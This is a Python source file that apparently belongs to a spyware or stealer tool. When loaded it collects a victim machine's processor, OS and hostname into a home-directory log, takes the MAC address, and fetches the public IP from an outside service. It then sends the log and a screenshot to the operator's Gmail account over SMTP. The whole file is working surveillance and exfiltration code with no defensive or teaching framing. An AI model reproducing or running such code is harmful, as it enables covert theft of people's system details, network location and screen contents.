import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from uuid import getnode as mac
from config import *
from email import encoders
import platform as pf
import requests
import time
import re
import os

directory = os.path.expanduser('~')

def INFO():
	processor = pf.processor()
	name_sys = pf.system() + ' ' + pf.release()
	net_pc = pf.node()
	global pc_config
	global directory

	pc_config = f'''
	Processor : { processor }\n
	System name : { name_sys }\n
	Network name : { net_pc }\n
	'''

	file = open(directory + '/log.txt', 'w')
	file.write(pc_config)
	file.close()


INFO()


def SEND_MAIL():
	port = 587
	smtp_server = "smtp.gmail.com"
	sender_email = GMAIL
	receiver_email = GMAIL
	password = PASSWORD

	mac_id = ':'.join(re.findall('..', '%012x' % mac()))
	ip_id = requests.get('https://ramziv.com/ip').text

	msg = MIMEMultipart()
	msg['Subject'] = 'MAC address: ' + mac_id + '---' + 'IP address: ' + ip_id
	msg['From'] = GMAIL

	try:
		with open(directory + '/log.txt') as fp:
			file = MIMEText(fp.read())
	except(FileNotFoundError, UnboundLocalError):
		pass

	img_data = open(directory + '/screenshot.png', 'rb').read()
	photo = MIMEImage(img_data, 'png')
	msg.attach(file)
	msg.attach(photo)

	context = ssl.create_default_context()
	server = smtplib.SMTP(smtp_server, port)
	server.starttls(context=context)
	server.login(sender_email, password)
	server.sendmail(sender_email, receiver_email, msg.as_string())
